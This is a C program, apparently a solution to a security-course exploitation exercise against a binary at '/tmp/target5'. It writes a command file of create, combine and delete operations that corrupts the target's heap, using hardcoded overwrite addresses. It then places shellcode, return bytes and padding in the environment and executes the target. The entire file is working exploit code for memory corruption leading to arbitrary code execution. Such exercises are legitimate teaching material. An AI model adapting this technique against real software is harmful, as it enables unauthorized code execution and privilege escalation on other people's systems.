#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int create_cmd_file(char *filename){

	int fd;
	char cmd[26];

	fd = open(filename, O_RDWR | O_CREAT);

	if(fd == -1)
		return -1;

	write(fd, "create 0 a\n", 11);
	write(fd, "create 1 bbbb\n", 14);
	write(fd, "create 2 cccccccccccccccccccccccc\n", 34);
	write(fd, "combine 2 1 2\n", 14);
	memcpy(cmd, "create 0 aaaaaaaa\xc6\xff\xff\xbe\x15\xfd\xff\xbe\n", 26);
	write(fd, cmd, 26);
	write(fd, "delete 1\n", 9);

	close(fd);
	return 0;

}

int main(void)
{
	char arg1[] = "commands";
	char *args[] = { TARGET, arg1, NULL };
	char my_env[80];
	char f = '\xcc';
	memcpy(my_env, shellcode, strlen(shellcode));
	memcpy(my_env+strlen(shellcode), "   \xf4\xff\xff\xea\xcc\xcc\xcc\xcc", 11);
	memset(my_env+strlen(shellcode)+11, f, 32);
	char *env[] = {my_env, NULL};

	create_cmd_file(arg1);

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
